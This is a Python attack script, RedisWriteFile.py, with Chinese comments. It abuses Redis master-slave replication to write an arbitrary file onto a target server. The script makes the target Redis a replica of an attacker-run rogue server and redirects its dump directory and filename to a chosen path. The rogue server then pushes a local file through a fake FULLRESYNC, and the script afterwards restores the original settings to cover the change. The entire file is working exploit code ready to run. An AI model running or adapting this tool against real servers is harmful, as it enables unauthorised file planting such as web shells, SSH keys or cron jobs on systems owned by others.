#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    :   RedisWriteFile.py
@Time    :   2020/05/22 22:55:13
@Author  :   R3start 
@Version :   1.0
'''

# 脚本介绍
# 通过 Redis 主从写出无损文件

import socket
import sys
from time import sleep
from optparse import OptionParser

CLRF = "\r\n"

BANNER = '''
______         _ _     _    _      _ _      ______ _ _      
| ___ \       | (_)   | |  | |    (_) |     |  ___(_) |     
| |_/ /___  __| |_ ___| |  | |_ __ _| |_ ___| |_   _| | ___ 
|    // _ \/ _` | / __| |/\| | '__| | __/ _ \  _| | | |/ _ \\
| |\ \  __/ (_| | \__ \  /\  / |  | | ||  __/ |   | | |  __/
\_| \_\___|\__,_|_|___/\/  \/|_|  |_|\__\___\_|   |_|_|\___|     

                    Author : R3start   
          Reference : redis-rogue-server.py
'''

def encode_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def encode_cmd(raw_cmd):
    return encode_cmd_arr(raw_cmd.split("##"))

def decode_cmd(cmd):
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")

def info(msg):
    print(f"\033[1;32;40m[info]\033[0m {msg}")

def din(sock, cnt=4096):
    global verbose
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;34;40m[->]\033[0m {msg}")
        else:
            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
    return msg.decode('gb18030')

def dout(sock, msg):
    global verbose
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;33;40m[<-]\033[0m {msg}")
        else:
            print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf


class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(('0.0.0.0', self._port))
        self._sock.listen(10)

    def close(self):
        self._sock.close()

    def handle(self, data):
        cmd_arr = decode_cmd(data)
        resp = ""
        phase = 0
        if cmd_arr[0].startswith("PING"):
            resp = "+PONG" + CLRF
            phase = 1
        elif cmd_arr[0].startswith("REPLCONF"):
            resp = "+OK" + CLRF
            phase = 2
        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break


def runserver(rhost, rport, lhost, lport,rpath,rfile):
    try:
        remote = Remote(rhost, rport)
        if auth:
            check = remote.do(f"AUTH##{auth}")
            if "invalid password" in check :
                info("Redis 认证密码错误!")
                exit()
        else:
            infos = remote.do("INFO")
            if "NOAUTH" in infos:
                info("Redis 需要密码认证")
                exit()
        info("连接恶意主服务器: %s:%s " % (rhost,rport))
        info("连接恶意主状态: %s " % (remote.do(f"SLAVEOF##{lhost}##{lport}")))
        info("设置写出路径为: %s " % (str(rpath)))
        info("设置写出路径状态: %s " % (remote.do(f"CONFIG##SET##dir##{str(rpath)}")))
        info("设置写出文件为: %s" % (rfile))
        info("设置写出文件状态: %s " % (remote.do(f"CONFIG##SET##dbfilename##{rfile}")))
        sleep(2)
        rogue = RogueServer(lhost, lport)
        rogue.exp()
        sleep(2)
        info("断开主从连接: %s" % (remote.do("SLAVEOF##NO##ONE")))
        info("恢复原始文件名: %s" % (remote.do("CONFIG##SET##dbfilename##dump.rdb")))
        rogue.close()
    except Exception as e:
        print("\033[1;31;m[-]\033[0m 发生错误！ : {} \n[*] Exit..".format(e))
if __name__ == '__main__':
    print(BANNER)
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
            help="target host", metavar="REMOTE_HOST")
    parser.add_option("--rport", dest="rp", type="int",
            help="target redis port, default 6379", default=6379,
            metavar="REMOTE_PORT")
    parser.add_option("--lhost", dest="lh", type="string",
            help="rogue server ip", metavar="LOCAL_HOST")
    parser.add_option("--lport", dest="lp", type="int",
            help="rogue server listen port, default 21000", default=21000,
            metavar="LOCAL_PORT")
    parser.add_option("--rpath", dest="rpath", type="string",
            help="write to target file path, default '.'", metavar="Target_File_Path",default='.')
    parser.add_option("--rfile", dest="rfile", type="string",
            help="write to target file name, default dump.rdb", metavar="Target_File_Name",default='dump.rdb')
    parser.add_option("--lfile", dest="lfile", type="string",
            help="Local file that needs to be written", metavar="Local_File_Name",default='dump.rdb')
    parser.add_option("--auth", dest="auth", type="string", help="redis password")
    parser.add_option("-v", "--verbose", action="store_true", default=False,
            help="Show full data stream")

    (options, args) = parser.parse_args()
    global verbose, payload, filename, auth
    auth = options.auth
    localfile = options.lfile
    verbose = options.verbose
    payload = open(localfile, "rb").read()

    if not options.rh or not options.lh:
        info("请输入完整参数,-h 查看使用帮助")
        exit()

    info(f"TARGET {options.rh}:{options.rp}")
    info(f"SERVER {options.lh}:{options.lp}")
    try:
        runserver(options.rh, options.rp, options.lh, options.lp,options.rpath,options.rfile)
    except Exception as e:
        info(repr(e))